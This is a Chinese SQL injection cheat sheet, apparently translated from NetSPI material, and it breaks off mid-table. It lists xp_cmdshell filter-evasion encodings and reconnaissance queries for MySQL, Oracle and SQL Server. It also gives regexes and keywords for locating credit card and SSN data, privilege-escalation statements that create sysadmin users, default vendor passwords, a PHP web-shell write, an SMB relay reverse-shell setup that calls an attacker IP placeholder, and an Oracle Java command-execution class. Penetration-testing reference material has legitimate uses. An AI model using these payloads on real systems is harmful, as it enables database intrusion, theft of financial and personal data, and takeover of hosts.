<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>ASCII &gt; 字符</td><td align="center">SELECT char（65）</td></tr><tr><td>字符 &gt; ASCII</td><td align="center">SELECT ascii（'A'）</td></tr><tr><td>Hex&gt; Int</td><td align="center">SELECT 0x20 + 0x40</td></tr><tr><td>按位 AND</td><td align="center">SELECT 6 &amp; 2</td></tr><tr><td>按位或</td><td align="center">SELECT 6</td></tr><tr><td>按位否定</td><td align="center">SELECT ~6</td></tr><tr><td>按位 XOR</td><td align="center">SELECT 6 ^ 2</td></tr><tr><td>字符串截取</td><td align="center">SELECT substring('abcd', 3, 2)&nbsp;<br>substring(string, index, length)</td></tr><tr><td>Casting</td><td align="center">SELECT cast('1' AS unsigned integer)&nbsp;<br>SELECT cast('123' AS char)</td></tr><tr><td>字符串连接</td><td align="center">SELECT concat('net','spi')</td></tr><tr><td>注释</td><td align="center">SELECT 1 --comment &nbsp;<br>SELECT/*comment*/1</td></tr><tr><td>避免引号</td><td align="center">SELECT char(65)+char(66) -- returns AB</td></tr><tr><td>使用％0d 避免使用分号</td><td align="center"><code>%0dwaitfor+delay+'0:0:10'--</code></td></tr><tr><td>Bypass Filtering</td><td align="center">EXEC xP_cMdsheLL 'dir';</td></tr><tr><td>用注释避免空格</td><td align="center">EXEC/**/xp_cmdshell/**/'dir';-- ';ex/**/ec xp_cmds/**/hell'dir';</td></tr><tr><td>用连接避免查询检测</td><td align="center">DECLARE @cmd as varchar(3000);<br>SET @cmd = 'x'+'p'+'_'+'c'+'m'+'d'+'s'+'h'+'e'+'l'+'l'+'/**/'+""+'d'+'i'+'r'+"";<br>exec(@cmd);</td></tr><tr><td>用字符编码避免查询检测</td><td align="center">DECLARE @cmd as varchar(3000);<br>SET @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+<br>CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)<br>+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+<br>CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+<br>CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+<br>CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));<br>EXEC(@cmd);</td></tr><tr><td>用 base64 编码避免查询检测</td><td align="center">DECLARE @data varchar(max), @XmlData xml;SET @data = 'ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn';<br>SET @XmlData = CAST(''+ @data +'' as xml);SET @data = CONVERT(varchar(max), @XmlData.value('(data)[1]', 'varbinary(max)'));<br>exec (@data);</td></tr><tr><td>用 Nchar 编码避免查询检测</td><td align="center">DECLARE @cmd as nvarchar(3000);<br>SET @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+<br>nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+<br>nchar(101)+nchar(114)+nchar(46)+nchar(46)+<br>nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)<br>+nchar(100)+nchar(115)+nchar(104)+<br>nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)<br>+nchar(105)+nchar(114)+nchar(39)+nchar(59));<br>EXEC(@cmd);</td></tr><tr><td>用 ASCII + CAST 编码避免查询检测</td><td align="center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = cast(0x78705F636D647368656C6C202764697227 as varchar(MAX));<br>exec(@cmd);</td></tr><tr><td>用 ASCII + CONVERT &nbsp;编码避免查询检测</td><td align="center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = convert(varchar(MAX),0x78705F636D647368656C6C202764697227);<br>exec(@cmd);</td></tr><tr><td>用 varbinary(MAX) &nbsp;避免查询检测</td><td align="center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);<br>exec(@cmd);</td></tr><tr><td>用 sp_sqlexec &nbsp;避免 EXEC()</td><td align="center">DECLARE @cmd as varchar(3000);<br>SET @cmd = convert(varchar(0),0×78705F636D647368656C6C202764697227);<br>exec sp_sqlexec @cmd;</td></tr><tr><td>执行 xp_cmdshell 'dir'</td><td align="center">DECLARE @tmp as varchar(MAX);<br>SET @tmp = char(88)+char(80)+char(95)+char(67)+char(77)+<br>char(68)+char(83)+char(72)+char(69)+char(76)+char(76);<br>exec @tmp 'dir';</td></tr></tbody></table>

**0x04** **攻击查询** 
------------------

### **1、信息收集**

收集有关任何测试环境的信息通常很有价值; 版本号，用户帐户和数据库都有助于升级漏洞。以下是常见的方法。

`*`需要特权用户

#### **MySQL**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>版本</td><td align="center">SELECT @@version</td></tr><tr><td>单个用户</td><td align="center">SELECT user()&nbsp;<br>SELECT system_user()</td></tr><tr><td>所有用户</td><td align="center">SELECT user FROM mysql.user&nbsp;<br><code>*&nbsp;</code>SELECT Super_priv FROM mysql.user WHERE user= 'root' LIMIT 1,1</td></tr><tr><td>表</td><td align="center">SELECT table_schema, table_name FROM information_schema.tables</td></tr><tr><td>列</td><td align="center">SELECT table_name, column_name FROM information_schema.columns</td></tr><tr><td>数据库</td><td align="center">SELECT schema_name FROM information_schema.schemata</td></tr><tr><td>当前数据库名称</td><td align="center">SELECT database()</td></tr><tr><td>查询其他数据库</td><td align="center">USE [database_name]; SELECT database(); &nbsp;<br>SELECT [column] FROM [database_name].[table_name]</td></tr><tr><td>列数</td><td align="center">SELECT count(*) FROM information_schema.columns WHERE table_name = '[table_name]'</td></tr><tr><td>DBA 账户</td><td align="center">SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'</td></tr><tr><td>密码哈希</td><td align="center">SELECT host, user, password FROM mysql.user</td></tr><tr><td>Schema</td><td align="center">SELECT schema()</td></tr><tr><td>数据路径</td><td align="center">SELECT @@datadir</td></tr><tr><td>读取文件</td><td align="center"><code>*</code>&nbsp;SELECT LOAD_FILE('/etc/passwd')</td></tr></tbody></table>

#### **Oracle**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>版本</td><td align="center">SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';<br>SELECT banner FROM v$version WHERE banner LIKE 'TNS%';<br>SELECT version FROM v$instance;</td></tr><tr><td>单个用户</td><td align="center">SELECT user FROM dual</td></tr><tr><td>所有用户</td><td align="center">SELECT username FROM all_users ORDER BY username;<br><code>*&nbsp;</code>SELECT name FROM sys.user$;</td></tr><tr><td>表</td><td align="center">SELECT table_name FROM all_tables;&nbsp;<br>SELECT owner, table_name FROM all_tables;</td></tr><tr><td>通过列名称获取表</td><td align="center">SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';</td></tr><tr><td>列</td><td align="center">SELECT column_name FROM all_tab_columns WHERE table_name = 'blah'; &nbsp;<br>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';</td></tr><tr><td>当前数据库名称</td><td align="center">SELECT global_name FROM global_name;<br>SELECT name FROM V$DATABASE;&nbsp;<br>SELECT instance_name FROM V$INSTANCE;<br>SELECT SYS.DATABASE_NAME FROM DUAL;</td></tr><tr><td>数据库</td><td align="center">SELECT DISTINCT owner FROM all_tables;</td></tr><tr><td>DBA 账户</td><td align="center">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';</td></tr><tr><td>特权</td><td align="center">SELECT * FROM session_privs;(Retrieves Current Privs)<br><code>*</code>&nbsp;SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';<br><code>*</code>&nbsp;SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';<br>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td></tr><tr><td>DB 文件的位置</td><td align="center">SELECT name FROM V$DATAFILE;</td></tr><tr><td>主机名，IP 地址</td><td align="center">SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; (IP 地址)<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; (主机名)</td></tr></tbody></table>

#### **SQL Server**

<table width="677"><thead><tr><th width="36">描述</th><th width="499" align="center">语句</th></tr></thead><tbody><tr><td width="19">版本</td><td width="499" align="center">SELECT @@version;</td></tr><tr><td width="19">单个用户</td><td width="499" align="center">SELECT user;<br>SELECT system_user;<br>SELECT user_name();<br>SELECT loginame from master..sysprocesses where spid = @@SPID</td></tr><tr><td width="19">所有用户</td><td width="499" align="center">SELECT name from master..syslogins</td></tr><tr><td width="19">表</td><td width="499" align="center">SELECT table_catalog, table_name FROM information_schema.columns</td></tr><tr><td width="19">列</td><td width="499" align="center">SELECT table_catalog, column_name FROM information_schema.columns</td></tr><tr><td width="19">所有数据库</td><td width="499" align="center">SELECT name from master..sysdatabases;</td></tr><tr><td width="19">当前数据库</td><td width="499" align="center">SELECT db_name();</td></tr><tr><td width="19">服务器名称</td><td width="499" align="center">SELECT @@SERVERNAME</td></tr><tr><td width="19">查找存储过程</td><td width="499" align="center">SELECT * from master..sysobjects where name like 'sp%' order by name desc</td></tr><tr><td width="19">通过用户名获取 SUID</td><td width="499" align="center">SELECT SUSER_ID('sa')</td></tr><tr><td width="19">通过 SUID 获取用户名</td><td width="499" align="center">SELECT SUSER_NAME(1)</td></tr><tr><td width="19">检查账户是不是管理员</td><td width="499" align="center">IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))&nbsp;<br>SELECT is_srvrolemember('sysadmin');</td></tr><tr><td width="19">Policies</td><td width="499" align="center"><code>SELECT p.policy_id, p.name as [PolicyName], p.condition_id, c.name as [ConditionName], c.facet, c.expression as [ConditionExpression], p.root_condition_id, p.is_enabled, p.date_created, p.date_modified, p.description, p.created_by, p.is_system, t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id = c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id = p.object_set_id</code></td></tr><tr><td width="19">域用户</td><td width="499" align="center">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql</td></tr><tr><td width="19">DB 审计</td><td width="499" align="center"><code>SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id = d.database_specification_id</code></td></tr><tr><td width="19">Server 审计</td><td width="499" align="center"><code>SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id</code></td></tr><tr><td width="19">查询历史记录</td><td width="499" align="center"><code>SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),'Ad-Hoc') AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,(SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset / 2+1,( (CASE WHEN statement_end_offset = -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2) ELSE statement_end_offset END)- statement_start_offset) / 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count DESC</code></td></tr></tbody></table>

### **2、数据定位**

能够正确地识别和定位敏感信息可以以指数的方式减少在数据库中花费的时间，这意味着可以花费更多的时间在其他方向上。

#### **数据定位查询**

##### **MySQL**

<table width="677"><thead><tr><th width="59">描述</th><th width="476" align="center">语句</th></tr></thead><tbody><tr><td width="37">数据库大小</td><td width="476" align="center"><code>SELECT table_schema "Database Name",sum( data_length + index_length ) / 1024 / 1024 "Database Size in MB",sum( data_free )/ 1024 / 1024 "Free Space in MB" FROM information_schema.TABLES GROUP BY table_schema ;</code></td></tr><tr><td width="37">数据库名称关键字</td><td width="476" align="center"><code>SELECT table_schema "Database Name" FROM information_schema.TABLES WHERE table_schema LIKE "%passwords%" GROUP BY table_schema ;</code></td></tr><tr><td width="37">表名关键字</td><td width="476" align="center"><code>SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE "information_schema" AND table_name LIKE "%admin%";</code></td></tr><tr><td width="37">列名关键字</td><td width="476" align="center"><code>SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE "%password%";</code></td></tr><tr><td width="37">列数据正则表达式</td><td width="476" align="center"><code>SELECT * from credit_cards WHERE cc_number REGEXP '^4[0-9]{15}$';</code></td></tr></tbody></table>

##### Oracle

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>寻找敏感数据</td><td align="center">SELECT owner,table_name,column_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';</td></tr><tr><td>寻找特权</td><td align="center">SELECT * FROM session_privs<br>SELECT * FROM USER_SYS_PRIVS&nbsp;<br>SELECT * FROM USER_TAB_PRIVS<br>SELECT * FROM USER_TAB_PRIVS_MADE<br>SELECT * FROM USER_TAB_PRIVS_RECD<br>SELECT * FROM ALL_TAB_PRIVS<br>SELECT * FROM USER_ROLE_PRIVS</td></tr><tr><td>提取存储过程 / Java 源</td><td align="center">SELECT * FROM all_source WHERE owner NOT IN ('SYS','SYSTEM')&nbsp;<br>SELECT * FROM all_source WHERE TYPE LIKE '%JAVA %'&nbsp;<br>SELECT TO_CHAR(DBMS_METADATA.get_ddl('TABLE','DEPT','CONSUELA')) FROM dual</td></tr></tbody></table>

##### SQL Server

<table width="677"><thead><tr><th width="41">描述</th><th width="494" align="center">语句</th></tr></thead><tbody><tr><td width="24">列出非默认数据库</td><td width="494" align="center">SELECT NAME FROM sysdatabases WHERE (NAME NOT LIKE 'distribution') AND (NAME NOT LIKE 'master') AND (NAME NOT LIKE 'model') AND (NAME NOT LIKE 'msdb') AND (NAME NOT LIKE 'publication') AND (NAME NOT LIKE 'reportserver') AND (NAME NOT LIKE 'reportservertempdb') AND (NAME NOT LIKE 'resource') AND (NAME NOT LIKE 'tempdb') ORDER BY NAME;</td></tr><tr><td width="24">列出非默认表</td><td width="494" align="center">SELECT '[' + SCHEMA_NAME(t.schema_id) + '].[' + t.name + ']' AS fulltable_name, SCHEMA_NAME(t.schema_id) AS schema_name, t.name AS table_name, i.rows FROM sys.tables AS t INNER JOIN sys.sysindexes AS i ON t.object_id = i.id AND i.indid &lt; 2 WHERE (ROWS&gt; 0) AND (t.name NOT LIKE 'syscolumns') AND (t.name NOT LIKE 'syscomments') AND (t.name NOT LIKE 'sysconstraints') AND (t.name NOT LIKE 'sysdepends') AND (t.name NOT LIKE 'sysfilegroups') AND (t.name NOT LIKE 'sysfiles') AND (t.name NOT LIKE 'sysforeignkeys') AND (t.name NOT LIKE 'sysfulltextcatalogs') AND (t.name NOT LIKE 'sysindexes') AND (t.name NOT LIKE 'sysindexkeys') AND (t.name NOT LIKE 'sysmembers') AND (t.name NOT LIKE 'sysobjects') AND (t.name NOT LIKE 'syspermissions') AND (t.name NOT LIKE 'sysprotects') AND (t.name NOT LIKE 'sysreferences') AND (t.name NOT LIKE 'systypes') AND (t.name NOT LIKE 'sysusers') ORDER BY TABLE_NAME;</td></tr><tr><td width="24">列名搜索</td><td width="494" align="center">SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like '%password%'</td></tr><tr><td width="24">列出非默认列</td><td width="494" align="center">SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE CHARACTER_MAXIMUM_LENGTH &gt; 14 AND DATA_TYPE NOT IN ('bigint','binary','bit','cursor','date','datetime','datetime2', 'datetimeoffset','float','geography','hierarchyid','image','int','money','real', 'smalldatetime','smallint','smallmoney','sql_variant','table','time','timestamp', 'tinyint','uniqueidentifier','varbinary','xml') AND TABLE_NAME='CreditCard' OR CHARACTER_MAXIMUM_LENGTH &lt; 1 AND DATA_TYPE NOT IN ( 'bigint', 'binary', 'bit', 'cursor', 'date', 'datetime', 'datetime2', 'datetimeoffset', 'float', 'geography', 'hierarchyid', 'image', 'int', 'money', 'real', 'smalldatetime', 'smallint', 'smallmoney', 'sql_variant', 'table', 'time', 'timestamp', 'tinyint', 'uniqueidentifier', 'varbinary', 'xml') AND TABLE_NAME='CreditCard' ORDER BY COLUMN_NAME;</td></tr><tr><td width="24">搜索透明加密</td><td width="494" align="center">SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY a.database_id WHERE is_encrypted=1</td></tr><tr><td width="24">按数据库大小搜索</td><td width="494" align="center">SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename, (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb] FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY DbSizeMb DESC</td></tr></tbody></table>

#### 数据定位正则表达式

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>所有主要的信用卡提供商</td><td align="center">^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$</td></tr><tr><td>Unmasked | Masked SSN</td><td align="center">^(\d{3}-?\d{2}-?\d{4}|XXX-XX-XXXX)$</td></tr></tbody></table>

#### 数据定位关键字

<table width="677"><thead><tr><th>关键字</th></tr></thead><tbody><tr><td>credit</td></tr><tr><td>card</td></tr><tr><td>pin</td></tr><tr><td>cvv</td></tr><tr><td>pan</td></tr><tr><td>password</td></tr><tr><td>social</td></tr><tr><td>ssn</td></tr><tr><td>account</td></tr><tr><td>confidential</td></tr></tbody></table>

### **3、提升特权**

某些功能需要特权用户，并且为了升级漏洞，特权用户始终是第一步。

#### **MySQL**

还没有数据，如果您知道任何有用的方法，请在我们的 Github 上做出贡献！

#### **Oracle**

`*`需要特权用户

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>转储所有 DBA 用户名</td><td align="center">SELECT username FROM user_role_privs WHERE granted_role='DBA';</td></tr><tr><td>建立 DBA 用户</td><td align="center"><code>*</code>&nbsp;GRANT DBA to USER</td></tr><tr><td>创建过程</td><td align="center"><code>CREATE OR REPLACE PROCEDURE "SYSTEM".netspi1 (id IN VARCHAR2) AS PRAGMA autonomous_transaction; EXECUTE IMMEDIATE 'grant dba to scott'; COMMIT; END; BEGIN SYSTEM.netspi1('netspi'); END;</code></td></tr><tr><td>查找数据库链接</td><td align="center">SELECT * FROM DBA_DB_LINKS<br>SELECT * FROM ALL_DB_LINKS<br>SELECT * FROM USER_DB_LINKS</td></tr><tr><td>查询数据库链接</td><td align="center">SELECT * FROM sales@miami -- minimum for preconfigured<br>SELECT * FROM harold@netspi.com -- standard usage for selecting table from schema on remote server<br>SELECT * FROM harold@netspi.com@hq_1 -- standard usage for selecting table from schema on remote server instance<br>SELECT db_link,password FROM user_db_links WHERE db_link LIKE 'TEST%''<br>SELECT name,password FROM sys.link$ WHERE name LIKE 'TEST%';<br>SELECT name,passwordx FROM sys.link$ WHERE name LIKE 'TEST%';</td></tr><tr><td>在数据库链接上执行存储过程</td><td align="center">EXEC mySchema.myPackage.myProcedure@myRemoteDB('someParameter');<br>SELECT dbms_xmlquery.getxml('select * from emp') FROM harold@netspi.com</td></tr><tr><td>创建数据库链接</td><td align="center">CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com; -- connected user setup<br>CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com CONNECT TO harold AS tiger; -- standard defined user/pass<br>CREATE SHARED PUBLIC DATABASE LINK hq.netspi.com.com@hq_1 USING 'string_to_hq_1'; -- instance specific<br>CREATE SHARED PUBLIC DATABASE LINK link_2 CONNECT TO jane IDENTIFIED BY doe USING 'us_supply'; -- defined user<br>pass</td></tr><tr><td>删除链接</td><td align="center">DROP DATABASE LINK miami;</td></tr></tbody></table>

#### **SQL Server**

`*`需要特权用户。以下查询需要各种权限类型。请继续关注详细的权限提升路径。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>建立 DBA 用户</td><td align="center">* EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';</td></tr><tr><td>授予所有自定义对象的执行权限</td><td align="center">SELECT 'grant exec on' + QUOTENAME(ROUTINE_SCHEMA) + '.' +<br>QUOTENAME(ROUTINE_NAME) + 'TO test' FROM INFORMATION_SCHEMA.ROUTINES<br>WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),'IsMSShipped') = 0 ;</td></tr><tr><td>授予执行所有存储过程</td><td align="center">CREATE ROLE db_executor<br>GRANT EXECUTE TO db_executor<br>exec sp_addrolemember 'db_executor', 'YourSecurityAccount'</td></tr><tr><td>UNC 路径注入</td><td align="center">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e<br>https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/</td></tr><tr><td>检测非模拟登录</td><td align="center">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_<br>principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</td></tr><tr><td>模拟登录&nbsp;<br>注意：REVERT 会将您带回原始登录名。</td><td align="center">EXECUTE AS LOGIN = 'sa'; SELECT @@VERSION;</td></tr><tr><td>创建 sysadmin 用户</td><td align="center"><code>*</code>&nbsp;USE [master]<br>GO<br>CREATE LOGIN [test] WITH PASSSWORD=N 'test', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF<br>GO<br>EXEC master..sp_addsrvrolemember @loginame=N'test', @rolename=N'sysadmin'<br>GO</td></tr><tr><td>创建 sysadmin 用户</td><td align="center"><code>*</code>&nbsp;EXEC sp_addlogin 'user', 'pass';<br><code>*&nbsp;</code>EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';</td></tr><tr><td>删除用户</td><td align="center"><code>*</code>&nbsp;EXEC sp_droplogin 'user';</td></tr><tr><td>检索 SQL 代理连接密码</td><td align="center">exec msdb.dbo.sp_get_sqlagent_properties</td></tr><tr><td>检索 DTS 连接密码</td><td align="center">select msdb.dbo.rtbldmbprops</td></tr><tr><td>获取 sysadmin 作为本地管理员</td><td align="center">https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/</td></tr><tr><td>启动存储过程</td><td align="center">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</td></tr><tr><td>触发器创建</td><td align="center">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</td></tr><tr><td>Windows 自动登录密码</td><td align="center">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/</td></tr><tr><td>xp_regwrite 非 sysadmin 执行</td><td align="center">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</td></tr><tr><td>具有可信赖数据库的存储过程</td><td align="center">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases</td></tr><tr><td>存储过程用户模拟</td><td align="center">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/</td></tr><tr><td>默认密码</td><td align="center">sa:sa<br>sa:[empty]&nbsp;<br>[username]:[username]</td></tr><tr><td>实例的默认密码（实例名称，用户，密码）</td><td align="center">"ACS","ej","ej"<br>"ACT7","sa","sage"&nbsp;<br>"AOM2","admin","ca_admin"&nbsp;<br>"ARIS","ARIS9","*ARIS!1dm9n#"&nbsp;<br>"AutodeskVault","sa","AutodeskVault@26200" "BOSCHSQL","sa","RPSsql12345"&nbsp;<br>"BPASERVER9","sa","AutoMateBPA9"&nbsp;<br>"CDRDICOM","sa","CDRDicom50!"&nbsp;<br>"CODEPAL","sa","Cod3p@l"&nbsp;<br>"CODEPAL08","sa","Cod3p@l"&nbsp;<br>"CounterPoint","sa","CounterPoint8"&nbsp;<br>"CSSQL05","ELNAdmin","ELNAdmin"&nbsp;<br>"CSSQL05","sa","CambridgeSoft_SA"&nbsp;<br>"CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!"&nbsp;<br>"DHLEASYSHIP","sa","DHLadmin@1"&nbsp;<br>"DPM","admin","ca_admin"&nbsp;<br>"DVTEL","sa",""&nbsp;<br>"EASYSHIP","sa","DHLadmin@1"&nbsp;<br>"ECC","sa","Webgility2011"&nbsp;<br>"ECOPYDB","e+C0py2007_@x","e+C0py2007_@x"&nbsp;<br>"ECOPYDB","sa","ecopy"&nbsp;<br>"Emerson2012","sa","42Emerson42Eme"&nbsp;<br>"HDPS","sa","sa"&nbsp;<br>"HPDSS","sa","Hpdsdb000001"&nbsp;<br>"HPDSS","sa","hpdss"&nbsp;<br>"INSERTGT","msi","keyboa5"&nbsp;<br>"INSERTGT","sa",""&nbsp;<br>"INTRAVET","sa","Webster#1"&nbsp;<br>"MYMOVIES","sa","t9AranuHA7"&nbsp;<br>"PCAMERICA","sa","pcAmer1ca"&nbsp;<br>"PCAMERICA","sa","PCAmerica"&nbsp;<br>"PRISM","sa","SecurityMaster08"&nbsp;<br>"RMSQLDATA","Super","Orange"&nbsp;<br>"RTCLOCAL","sa","mypassword"&nbsp;<br>"SALESLOGIX","sa","SLXMaster"&nbsp;<br>"SIDEXIS_SQL","sa","2BeChanged"&nbsp;<br>"SQL2K5","ovsd","ovsd"&nbsp;<br>"SQLEXPRESS","admin","ca_admin"&nbsp;<br>"STANDARDDEV2014","test","test" "TEW_SQLEXPRESS","tew","tew"&nbsp;<br>"vocollect","vocollect","vocollect"&nbsp;<br>"VSDOTNET","sa",""&nbsp;<br>"VSQL","sa","111"</td></tr></tbody></table>

### **4、执行系统命令**

执行系统命令是 SQL 注入的主要目标之一，这有助于完全控制主机操作系统。这可能通过直接执行命令，修改现有数据以在网页上放置 shell 或者利用数据库中的隐藏功能来实现。

#### **MySQL**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>命令执行（PHP）</td><td align="center">SELECT ""INTO OUTFILE'/var/www/shell.php'</td></tr><tr><td>使用 MySQL CLI Access 执行命令</td><td align="center">https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</td></tr></tbody></table>

SMB 中继外壳

Requires

*   Metasploit（https://www.metasploit.com/）
    
*   smbrelayx（https://github.com/CoreSecurity/impacket）
    

##### 生成反向 shell 有效负载

```
生成一个侦听器来传递反向shell
```

```
smbrelayx.py -h VICTIM.IP.GOES.HERE -e ./reverse\_shell.exe
```

##### 执行下面的任何一个 MySQL 查询来调用监听器

```
select load\_file('\\\\\\\\YOUR.IP.GOES.HERE\\\\aa');
select load\_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);
select 'netspi' into dumpfile '\\\\\\\\YOUR.IP.GOES.HERE\\\\aa';
select 'netspi' into outfile '\\\\\\\\YOUR.IP.GOES.HERE\\\\aa';
load data infile '\\\\\\\\YOUR.IP.GOES.HERE\\\\aa' into table database.table\_name;
```

有关更多信息，请参见此处（https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/）

#### **Oracle**

如果安装了 Java，可用于执行命令

<table width="677"><thead><tr><th width="83">描述</th><th width="452" align="center">语句</th></tr></thead><tbody><tr><td width="66">创建 Java 类</td><td width="452" align="center">/* create Java class */ &nbsp;<br><code>BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END;&nbsp;</code><br>/<br><code>BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END;&nbsp;</code><br>/&nbsp;<br>/* run OS command */&nbsp;<br><code>SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;</code></td></tr><tr><td width="66">创建 Java 类（十六进制编码）</td><td width="452" align="center">/* create Java class */<br>SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION;&nbsp;<br>begin execute immediate 